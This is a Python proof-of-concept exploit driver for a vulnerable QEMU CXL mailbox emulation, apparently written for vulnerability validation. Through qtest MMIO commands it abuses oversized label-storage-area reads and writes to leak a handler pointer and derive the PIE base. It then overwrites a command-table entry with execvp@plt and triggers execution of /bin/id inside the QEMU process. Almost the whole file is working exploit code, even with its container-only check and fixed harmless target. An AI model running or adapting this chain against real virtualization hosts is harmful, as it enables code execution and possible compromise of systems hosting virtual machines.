#!/usr/bin/env python3
"""Bounded CXL mailbox validation for one pinned, vulnerable QEMU build.

The driver speaks qtest MMIO and HMP only.  It composes the C25-f adjacent
read with the C32-a command-table overwrite, then invokes a fixed ``/bin/id``
target through the build's ``execvp@plt`` entry.  Runtime addresses are
derived from a freshly disclosed handler and ELF-relative profile values.

This is intentionally container-only.  A successful receipt proves command
execution in the QEMU process' container context; it does not prove a booted
guest path, a container escape, or compromise of the outer Docker host.
"""

from __future__ import annotations

import argparse
import dataclasses
import json
import os
from pathlib import Path
import re
import socket
import sys
import time
from typing import Any, Mapping


MAILBOX_PAYLOAD_BYTES = 2048
MAX_COMMAND_LENGTH = (1 << 20) - 1
MAX_SET_LSA_DATA = MAILBOX_PAYLOAD_BYTES - 8
EXEC_PATH = b"/bin/id\x00"
SELECTED_COMMAND = 5  # INFOSTAT / BACKGROUND_OPERATION_ABORT

REG_CTRL = 0x04
REG_CMD = 0x08
REG_STS = 0x10
REG_PAYLOAD = 0x20

PROOF_SIGNALS = (
    "baseline_command_unsupported",
    "leaked_handler_nonzero",
    "page_aligned_pie_base",
    "staged_entry_exact_match",
    "zero_length_trigger",
    "qtest_connection_closed",
    "stdout_contains_identity",
)


class ChainAbort(RuntimeError):
    """An expected validation failure with a partially useful receipt."""


def parse_int(value: Any, key: str) -> int:
    if isinstance(value, bool):
        raise ValueError(f"{key} must be an integer, not a boolean")
    if isinstance(value, int):
        parsed = value
    elif isinstance(value, str):
        try:
            parsed = int(value, 0)
        except ValueError as exc:
            raise ValueError(f"{key} is not an integer: {value!r}") from exc
    else:
        raise ValueError(f"{key} must be an integer or 0x-prefixed string")
    if parsed < 0:
        raise ValueError(f"{key} must not be negative")
    return parsed


@dataclasses.dataclass(frozen=True)
class ExploitProfile:
    payload_to_primary_cci: int
    known_handler_offset: int
    target_symbol_offset: int
    cxl_cmd_size: int = 32
    handler_field_offset: int = 8
    selected_command: int = SELECTED_COMMAND
    known_handler_symbol: str = "cmd_infostat_bg_op_abort"
    target_symbol: str = "execvp@plt"
    source_commit: str | None = None
    qemu_sha256: str | None = None

    @classmethod
    def from_mapping(
        cls,
        raw: Mapping[str, Any],
        overrides: Mapping[str, int | None] | None = None,
    ) -> "ExploitProfile":
        merged = dict(raw)
        measured_layout = merged.get("layout", {})
        if not isinstance(measured_layout, dict):
            raise ValueError("profile layout must be a JSON object")
        for key, value in (overrides or {}).items():
            if value is not None:
                merged[key] = value

        required = (
            "payload_to_primary_cci",
            "known_handler_offset",
            "target_symbol_offset",
        )
        missing = [key for key in required if key not in merged]
        if missing:
            raise ValueError("profile is missing required keys: " + ", ".join(missing))

        profile = cls(
            payload_to_primary_cci=parse_int(
                merged["payload_to_primary_cci"], "payload_to_primary_cci"
            ),
            known_handler_offset=parse_int(
                merged["known_handler_offset"], "known_handler_offset"
            ),
            target_symbol_offset=parse_int(
                merged["target_symbol_offset"], "target_symbol_offset"
            ),
            cxl_cmd_size=parse_int(
                merged.get(
                    "cxl_cmd_size",
                    merged.get(
                        "command_entry_bytes",
                        measured_layout.get("command_entry_bytes", 32),
                    ),
                ),
                "command_entry_bytes",
            ),
            handler_field_offset=parse_int(
                merged.get(
                    "handler_field_offset",
                    measured_layout.get("handler_field_offset", 8),
                ),
                "handler_field_offset",
            ),
            selected_command=parse_int(
                merged.get("selected_command", SELECTED_COMMAND), "selected_command"
            ),
            known_handler_symbol=str(
                merged.get("known_handler_symbol", "cmd_infostat_bg_op_abort")
            ),
            target_symbol=str(merged.get("target_symbol", "execvp@plt")),
            source_commit=(
                str(merged.get("source_commit", merged.get("qemu_commit")))
                if merged.get("source_commit", merged.get("qemu_commit"))
                else None
            ),
            qemu_sha256=(
                str(merged["qemu_sha256"]) if merged.get("qemu_sha256") else None
            ),
        )
        profile.validate()
        return profile

    def validate(self) -> None:
        if self.payload_to_primary_cci <= MAILBOX_PAYLOAD_BYTES:
            raise ValueError("payload_to_primary_cci must be beyond the mailbox payload")
        if self.payload_to_primary_cci > 1024 * 1024:
            raise ValueError("payload_to_primary_cci is implausibly large")
        if self.payload_to_primary_cci % 8:
            raise ValueError("payload_to_primary_cci must be 8-byte aligned")
        if not 16 <= self.cxl_cmd_size <= 256 or self.cxl_cmd_size % 8:
            raise ValueError("cxl_cmd_size must be an aligned value from 16 to 256")
        if self.handler_field_offset < len(EXEC_PATH):
            raise ValueError("handler_field_offset leaves no room for /bin/id plus NUL")
        if self.handler_field_offset + 8 > self.cxl_cmd_size:
            raise ValueError("handler pointer does not fit inside cxl_cmd_size")
        if self.known_handler_offset == 0 or self.target_symbol_offset == 0:
            raise ValueError("ELF-relative symbol offsets must be non-zero")
        if self.selected_command != SELECTED_COMMAND:
            raise ValueError("selected_command must identify BACKGROUND_OPERATION_ABORT (5)")
        if self.known_handler_symbol != "cmd_infostat_bg_op_abort":
            raise ValueError("profile must use cmd_infostat_bg_op_abort as the leak anchor")
        if self.target_symbol != "execvp@plt":
            raise ValueError("profile must target execvp@plt")

    def receipt_view(self) -> dict[str, Any]:
        view: dict[str, Any] = {
            "payload_to_primary_cci": self.payload_to_primary_cci,
            "command_entry_bytes": self.cxl_cmd_size,
            "cxl_cmd_size": self.cxl_cmd_size,
            "handler_field_offset": self.handler_field_offset,
            "selected_command": self.selected_command,
            "known_handler_symbol": self.known_handler_symbol,
            "known_handler_offset": hex(self.known_handler_offset),
            "target_symbol": self.target_symbol,
            "target_symbol_offset": hex(self.target_symbol_offset),
        }
        if self.source_commit:
            view["source_commit"] = self.source_commit
        if self.qemu_sha256:
            view["qemu_sha256"] = self.qemu_sha256
        return view


def load_profile(
    path: Path, overrides: Mapping[str, int | None] | None = None
) -> ExploitProfile:
    try:
        raw = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        raise ValueError(f"could not read profile {path.name!r}: {exc}") from exc
    if not isinstance(raw, dict):
        raise ValueError("profile root must be a JSON object")
    return ExploitProfile.from_mapping(raw, overrides)


def chain_geometry(profile: ExploitProfile) -> dict[str, int]:
    selected_handler_payload_offset = (
        profile.payload_to_primary_cci
        + profile.selected_command * profile.cxl_cmd_size
        + profile.handler_field_offset
    )
    selected_handler_lsa_offset = selected_handler_payload_offset - 8
    retrieve_offset = selected_handler_lsa_offset - 24
    first_cmd_lsa_offset = profile.payload_to_primary_cci
    first_handler_lsa_offset = first_cmd_lsa_offset + profile.handler_field_offset
    return {
        "selected_handler_payload_offset": selected_handler_payload_offset,
        "selected_handler_lsa_offset": selected_handler_lsa_offset,
        "retrieve_offset": retrieve_offset,
        "retrieve_length": 64,
        "first_cmd_lsa_offset": first_cmd_lsa_offset,
        "first_handler_lsa_offset": first_handler_lsa_offset,
        "overwrite_length": first_handler_lsa_offset + 8,
        "minimum_leak_length": selected_handler_payload_offset + 8,
    }


def build_authored_lsa(profile: ExploitProfile, target_pointer: int) -> bytes:
    geometry = chain_geometry(profile)
    if target_pointer <= 0 or target_pointer >= (1 << 64):
        raise ValueError("target pointer must fit in one non-zero qword")
    authored = bytearray(geometry["overwrite_length"])
    command_offset = geometry["first_cmd_lsa_offset"]
    handler_offset = geometry["first_handler_lsa_offset"]
    authored[command_offset : command_offset + len(EXEC_PATH)] = EXEC_PATH
    authored[handler_offset : handler_offset + 8] = target_pointer.to_bytes(8, "little")
    return bytes(authored)


def proof_is_complete(signals: Mapping[str, Any]) -> bool:
    return all(signals.get(name) is True for name in PROOF_SIGNALS)


def set_lsa_payload(offset: int, data: bytes) -> bytes:
    return offset.to_bytes(4, "little") + b"\x00" * 4 + data


def get_lsa_payload(offset: int, length: int) -> bytes:
    return offset.to_bytes(4, "little") + length.to_bytes(4, "little")


class Transcript:
    def __init__(self, path: Path):
        self._fh = path.open("w", encoding="utf-8")
        self.entries = 0

    def add(self, direction: str, text: str) -> None:
        self.entries += 1
        timestamp = f"{time.time():.6f}"
        self._fh.write(f"{timestamp} [{direction}] {text}\n")
        self._fh.flush()

    def close(self) -> None:
        self._fh.close()


def _connect_unix(path: Path, timeout: float = 60.0) -> socket.socket:
    deadline = time.monotonic() + timeout
    last_error: OSError | None = None
    while time.monotonic() < deadline:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            sock.connect(os.fspath(path))
            sock.settimeout(30.0)
            return sock
        except (FileNotFoundError, ConnectionRefusedError) as exc:
            last_error = exc
            sock.close()
            time.sleep(0.2)
    raise RuntimeError(f"socket {path.name!r} did not become ready: {last_error}")


class QtestClient:
    def __init__(self, path: Path, transcript: Transcript):
        self.transcript = transcript
        self.sock = _connect_unix(path)
        self.stream = self.sock.makefile("rwb", buffering=0)

    def command(self, line: str) -> int | None:
        self.transcript.add("qtest-tx", line)
        self.stream.write((line + "\n").encode("ascii"))
        while True:
            response = self.stream.readline()
            if not response:
                raise ConnectionError("qtest socket closed by peer")
            decoded = response.decode("ascii", errors="replace").strip()
            if not decoded:
                continue
            self.transcript.add("qtest-rx", decoded)
            if not decoded.startswith("OK"):
                raise RuntimeError(f"qtest command failed: {line!r} -> {decoded!r}")
            fields = decoded.split()
            if len(fields) < 2:
                return None
            try:
                return int(fields[1], 16)
            except ValueError:
                return None

    def writel(self, address: int, value: int) -> None:
        self.command(f"writel 0x{address:x} 0x{value & 0xFFFFFFFF:x}")

    def writeq(self, address: int, value: int) -> None:
        self.command(f"writeq 0x{address:x} 0x{value & 0xFFFFFFFFFFFFFFFF:x}")

    def readl(self, address: int) -> int:
        value = self.command(f"readl 0x{address:x}")
        if value is None:
            raise RuntimeError("qtest readl returned no value")
        return value

    def readq(self, address: int) -> int:
        value = self.command(f"readq 0x{address:x}")
        if value is None:
            raise RuntimeError("qtest readq returned no value")
        return value

    def close(self) -> None:
        try:
            self.stream.close()
        finally:
            self.sock.close()


class HmpClient:
    def __init__(self, path: Path, transcript: Transcript):
        self.transcript = transcript
        self.sock = _connect_unix(path)
        self._drain_welcome()

    def _drain_welcome(self) -> None:
        self.sock.settimeout(0.2)
        total = 0
        while True:
            try:
                chunk = self.sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            total += len(chunk)
        self.transcript.add("hmp-rx", f"welcome_bytes={total}")

    def command(self, command: str, wait: float = 4.0) -> str:
        self.transcript.add("hmp-tx", command)
        self.sock.sendall((command + "\n").encode("ascii"))
        received = bytearray()
        deadline = time.monotonic() + wait
        while time.monotonic() < deadline:
            self.sock.settimeout(0.5)
            try:
                chunk = self.sock.recv(1 << 20)
            except socket.timeout:
                continue
            if not chunk:
                break
            received.extend(chunk)
            if b"(qemu)" in received:
                break
        decoded = bytes(received).decode("utf-8", errors="replace")
        self.transcript.add("hmp-rx", decoded[:20000])
        return decoded

    def close(self) -> None:
        self.sock.close()


def parse_mtree_mailboxes(text: str) -> list[dict[str, Any]]:
    by_base: dict[int, dict[str, Any]] = {}
    for line in text.splitlines():
        if "mailbox" not in line:
            continue
        match = re.search(r"([0-9a-fA-F]{16})-([0-9a-fA-F]{16})", line)
        if not match:
            continue
        base = int(match.group(1), 16)
        end = int(match.group(2), 16)
        by_base[base] = {
            "base": base,
            "size": end - base + 1,
            "line": line.strip(),
        }
    return [by_base[key] for key in sorted(by_base)]


class Mailbox:
    def __init__(self, qtest: QtestClient, base: int):
        self.qtest = qtest
        self.base = base

    def sanity(self) -> dict[str, Any]:
        capability = self.qtest.readl(self.base)
        shift = capability & 0x1F
        return {
            "capability": hex(capability),
            "payload_size_shift": shift,
            "decoded_payload_bytes": (1 << shift) if shift else 0,
            "pass": shift == 11,
        }

    def run_command(
        self,
        command_set: int,
        command: int,
        payload: bytes = b"",
        declared_length: int | None = None,
    ) -> dict[str, Any]:
        if len(payload) > MAILBOX_PAYLOAD_BYTES:
            raise ValueError("driver refuses to write beyond the mailbox payload window")
        length = len(payload) if declared_length is None else declared_length
        if length < len(payload) or length > MAX_COMMAND_LENGTH:
            raise ValueError("declared mailbox length is invalid")

        padded = payload + b"\x00" * ((-len(payload)) % 8)
        for offset in range(0, len(padded), 8):
            value = int.from_bytes(padded[offset : offset + 8], "little")
            self.qtest.writeq(self.base + REG_PAYLOAD + offset, value)

        command_register = (
            ((length & MAX_COMMAND_LENGTH) << 16)
            | ((command_set & 0xFF) << 8)
            | (command & 0xFF)
        )
        self.qtest.writeq(self.base + REG_CMD, command_register)
        self.qtest.writel(self.base + REG_CTRL, 1)
        status = self.qtest.readq(self.base + REG_STS)
        completed_command = self.qtest.readq(self.base + REG_CMD)
        return {
            "status_register": hex(status),
            "errno": (status >> 32) & 0xFFFF,
            "output_length": (completed_command >> 16) & MAX_COMMAND_LENGTH,
            "command_set": command_set,
            "command": command,
            "declared_input_length": length,
            "payload_bytes_written": len(payload),
        }

    def read_payload(self, length: int) -> bytes:
        if not 0 <= length <= MAILBOX_PAYLOAD_BYTES:
            raise ValueError("driver refuses an out-of-window payload read")
        output = bytearray()
        for offset in range(0, length, 8):
            value = self.qtest.readq(self.base + REG_PAYLOAD + offset)
            output.extend(value.to_bytes(8, "little"))
        return bytes(output[:length])


def _abort(receipt: dict[str, Any], reason: str) -> None:
    receipt["aborted_reason"] = reason
    raise ChainAbort(reason)


def _identity_line(stdout_path: Path, timeout: float = 5.0) -> str | None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            text = stdout_path.read_text(encoding="utf-8", errors="replace")
        except FileNotFoundError:
            text = ""
        for line in text.splitlines():
            if line.startswith("uid=") and " gid=" in line and " groups=" in line:
                return line[:1000]
        time.sleep(0.1)
    return None


def execute_chain(
    mailbox: Mailbox,
    profile: ExploitProfile,
    leak_length: int,
    stdout_path: Path,
    receipt: dict[str, Any],
) -> None:
    geometry = chain_geometry(profile)
    if leak_length < geometry["minimum_leak_length"]:
        _abort(receipt, "declared leak length does not reach the selected handler")
    if leak_length > MAX_COMMAND_LENGTH:
        _abort(receipt, "declared leak length exceeds the mailbox command field")

    receipt["geometry"] = geometry
    receipt["declared_leak_length"] = leak_length
    receipt["steps"] = []
    signals = {name: False for name in PROOF_SIGNALS}
    receipt["proof_signals"] = signals

    identify = mailbox.run_command(0x40, 0x00)
    receipt["baseline_identify"] = identify
    baseline = mailbox.run_command(0x00, 0x00)
    signals["baseline_command_unsupported"] = baseline["errno"] == 3
    receipt["steps"].append({
        "step": "baseline_unassigned_0000",
        "result": baseline,
        "unsupported": signals["baseline_command_unsupported"],
    })
    if not signals["baseline_command_unsupported"]:
        _abort(receipt, "command 0000h was not unsupported before the overwrite")

    leak_payload = set_lsa_payload(0, b"L" * MAX_SET_LSA_DATA)
    leak_set = mailbox.run_command(
        0x41, 0x03, leak_payload, declared_length=leak_length
    )
    receipt["steps"].append({
        "step": "c25f_oversized_set_lsa_persist_adjacent_bytes",
        "result": leak_set,
        "adjacent_bytes_requested": leak_length - MAILBOX_PAYLOAD_BYTES,
    })
    if leak_set["errno"] != 0:
        _abort(receipt, "oversized SET_LSA did not complete successfully")

    leak_get = mailbox.run_command(
        0x41,
        0x02,
        get_lsa_payload(geometry["retrieve_offset"], geometry["retrieve_length"]),
    )
    leak_blob = (
        mailbox.read_payload(geometry["retrieve_length"])
        if leak_get["errno"] == 0
        else b""
    )
    handler_index = (
        geometry["selected_handler_lsa_offset"] - geometry["retrieve_offset"]
    )
    leaked_handler = int.from_bytes(
        leak_blob[handler_index : handler_index + 8], "little"
    )
    signals["leaked_handler_nonzero"] = leaked_handler != 0
    receipt["steps"].append({
        "step": "c25f_bounded_get_lsa_disclose_known_handler",
        "offset": geometry["retrieve_offset"],
        "length": geometry["retrieve_length"],
        "result": leak_get,
        "returned_hex": leak_blob.hex(),
        "leaked_handler": hex(leaked_handler),
    })
    if leaked_handler <= profile.known_handler_offset:
        _abort(receipt, "disclosed handler is not a plausible relocated symbol")

    pie_base = leaked_handler - profile.known_handler_offset
    target_pointer = pie_base + profile.target_symbol_offset
    canonical_userspace = 0x10000 <= target_pointer < (1 << 47)
    signals["page_aligned_pie_base"] = (pie_base & 0xFFF) == 0
    receipt["derived_addresses"] = {
        "leaked_handler": hex(leaked_handler),
        "pie_base": hex(pie_base),
        "execvp_plt": hex(target_pointer),
        "target_is_canonical_userspace": canonical_userspace,
    }
    if not signals["page_aligned_pie_base"]:
        _abort(receipt, "handler disclosure did not derive a page-aligned PIE base")
    if not canonical_userspace:
        _abort(receipt, "derived execvp@plt pointer is not a canonical user address")

    authored = build_authored_lsa(profile, target_pointer)
    for offset in range(0, len(authored), MAX_SET_LSA_DATA):
        chunk = authored[offset : offset + MAX_SET_LSA_DATA]
        stage = mailbox.run_command(0x41, 0x03, set_lsa_payload(offset, chunk))
        receipt["steps"].append({
            "step": "c32a_stage_path_and_handler",
            "offset": offset,
            "data_length": len(chunk),
            "result": stage,
        })
        if stage["errno"] != 0:
            _abort(receipt, f"bounded SET_LSA staging failed at offset {offset}")

    verify_length = profile.handler_field_offset + 8
    verify = mailbox.run_command(
        0x41,
        0x02,
        get_lsa_payload(geometry["first_cmd_lsa_offset"], verify_length),
    )
    verify_blob = mailbox.read_payload(verify_length) if verify["errno"] == 0 else b""
    expected = authored[
        geometry["first_cmd_lsa_offset"] :
        geometry["first_cmd_lsa_offset"] + verify_length
    ]
    signals["staged_entry_exact_match"] = verify_blob == expected
    receipt["steps"].append({
        "step": "verify_staged_entry",
        "result": verify,
        "returned_hex": verify_blob.hex(),
        "expected_hex": expected.hex(),
        "exact_match": signals["staged_entry_exact_match"],
    })
    if not signals["staged_entry_exact_match"]:
        _abort(receipt, "staged command entry did not read back exactly")

    payload_control = mailbox.run_command(0x41, 0x02, get_lsa_payload(0, 8))
    payload_control_blob = (
        mailbox.read_payload(8) if payload_control["errno"] == 0 else b""
    )
    receipt["steps"].append({
        "step": "supporting_zero_mailbox_payload_control",
        "result": payload_control,
        "returned_hex": payload_control_blob.hex(),
        "exact_zero_qword": payload_control_blob == b"\x00" * 8,
        "causal_for_execvp_argv": False,
    })

    install = mailbox.run_command(
        0x41, 0x02, get_lsa_payload(0, geometry["overwrite_length"])
    )
    receipt["steps"].append({
        "step": "c32a_get_lsa_install_overwritten_entry",
        "result": install,
    })
    if install["errno"] != 0:
        _abort(receipt, "GET_LSA overwrite did not complete successfully")

    # QEMU creates pl_in_copy with g_memdup2(pl, len_in).  A zero-length final
    # command therefore passes NULL as handler argument two (execvp's argv).
    # The earlier zero-payload readback is only a supporting control; it is not
    # the source of the NULL pointer.
    signals["zero_length_trigger"] = True
    receipt["final_invocation"] = {
        "command_set": 0,
        "command": 0,
        "declared_input_length": 0,
        "expected_handler_argument_two": "NULL from zero-length pl_in_copy",
    }
    try:
        unexpected = mailbox.run_command(0x00, 0x00)
        receipt["steps"].append({
            "step": "invoke_0000_through_execvp_plt",
            "unexpected_return": True,
            "result": unexpected,
        })
    except (ConnectionError, BrokenPipeError, OSError) as exc:
        signals["qtest_connection_closed"] = True
        receipt["steps"].append({
            "step": "invoke_0000_through_execvp_plt",
            "qtest_connection_closed": True,
            "transport_error_type": type(exc).__name__,
        })

    identity = _identity_line(stdout_path)
    signals["stdout_contains_identity"] = identity is not None
    receipt["identity_line"] = identity
    receipt["execution_target"] = "/bin/id"
    receipt["qtest_connection_closed"] = signals["qtest_connection_closed"]
    receipt["stdout_contains_uid"] = signals["stdout_contains_identity"]
    receipt["qemu_process_execution_proven"] = proof_is_complete(signals)
    receipt["qemu_process_replacement_proven"] = receipt[
        "qemu_process_execution_proven"
    ]
    receipt["claim_scope"] = {
        "proven": "fixed /bin/id execution in the QEMU process container context",
        "not_proven": [
            "mailbox access from a booted guest kernel",
            "escape from the lab container",
            "compromise of the outer Docker host",
        ],
    }
    if not receipt["qemu_process_execution_proven"]:
        _abort(receipt, "one or more required execution signals were absent")


def _inside_container() -> bool:
    return Path("/.dockerenv").is_file() or Path("/run/.containerenv").is_file()


def _utc_now() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def _write_receipt(path: Path, receipt: Mapping[str, Any]) -> None:
    path.write_text(json.dumps(receipt, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--run-dir", required=True, type=Path)
    parser.add_argument("--profile", required=True, type=Path)
    parser.add_argument("--leak-length", type=lambda value: int(value, 0), default=3000)
    parser.add_argument("--payload-to-primary-cci", type=lambda value: int(value, 0))
    parser.add_argument("--known-handler-offset", type=lambda value: int(value, 0))
    parser.add_argument("--target-symbol-offset", type=lambda value: int(value, 0))
    parser.add_argument("--cxl-cmd-size", type=lambda value: int(value, 0))
    parser.add_argument("--command-entry-bytes", type=lambda value: int(value, 0))
    parser.add_argument("--handler-field-offset", type=lambda value: int(value, 0))
    parser.add_argument("--selected-command", type=lambda value: int(value, 0))
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    if not _inside_container():
        print("refusing to run: this PoC is restricted to a container", file=sys.stderr)
        return 4

    run_dir = args.run_dir.resolve()
    run_dir.mkdir(parents=True, exist_ok=True)
    receipt_path = run_dir / "driver-result.json"
    transcript = Transcript(run_dir / "transcript.log")
    receipt: dict[str, Any] = {
        "schema": "qemu-cxl-mailbox-lab/receipt-v1",
        "started_utc": _utc_now(),
        "profile_file": args.profile.name,
        "ok": False,
        "qemu_process_execution_proven": False,
        "qemu_process_replacement_proven": False,
        "qtest_connection_closed": False,
        "stdout_contains_uid": False,
    }
    qtest: QtestClient | None = None
    hmp: HmpClient | None = None

    try:
        overrides = {
            "payload_to_primary_cci": args.payload_to_primary_cci,
            "known_handler_offset": args.known_handler_offset,
            "target_symbol_offset": args.target_symbol_offset,
            "cxl_cmd_size": (
                args.command_entry_bytes
                if args.command_entry_bytes is not None
                else args.cxl_cmd_size
            ),
            "handler_field_offset": args.handler_field_offset,
            "selected_command": args.selected_command,
        }
        profile = load_profile(args.profile, overrides)
        receipt["profile"] = profile.receipt_view()

        transcript.add("driver", "connecting to QEMU monitor and qtest sockets")
        hmp = HmpClient(run_dir / "mon.sock", transcript)
        qtest = QtestClient(run_dir / "qt.sock", transcript)
        mtree = hmp.command("info mtree")
        (run_dir / "mtree.txt").write_text(mtree, encoding="utf-8")
        regions = parse_mtree_mailboxes(mtree)
        if len(regions) != 1:
            raise RuntimeError(f"expected one unique mailbox region, found {len(regions)}")
        region = regions[0]
        receipt["mailbox"] = {
            "guest_physical_base": hex(region["base"]),
            "region_size": region["size"],
        }

        mailbox = Mailbox(qtest, region["base"])
        receipt["mailbox_sanity"] = mailbox.sanity()
        if not receipt["mailbox_sanity"]["pass"]:
            raise RuntimeError("mailbox capability did not report a 2048-byte payload")

        execute_chain(
            mailbox,
            profile,
            args.leak_length,
            run_dir / "qemu.stdout",
            receipt,
        )
        receipt["ok"] = receipt["qemu_process_execution_proven"]
    except ChainAbort as exc:
        receipt["error_type"] = type(exc).__name__
        receipt["error"] = str(exc)
    except Exception as exc:  # Receipt preservation is part of the lab contract.
        receipt["error_type"] = type(exc).__name__
        receipt["error"] = str(exc)[:2000]
    finally:
        if qtest is not None:
            try:
                qtest.close()
            except OSError:
                pass
        if hmp is not None:
            try:
                hmp.close()
            except OSError:
                pass
        receipt["finished_utc"] = _utc_now()
        receipt["transcript_operations"] = transcript.entries
        transcript.close()
        _write_receipt(receipt_path, receipt)

    print(json.dumps({
        "receipt": receipt_path.name,
        "qemu_process_execution_proven": receipt["qemu_process_execution_proven"],
        "qemu_process_replacement_proven": receipt[
            "qemu_process_replacement_proven"
        ],
    }, sort_keys=True))
    return 0 if receipt["ok"] else 3


if __name__ == "__main__":
    raise SystemExit(main())
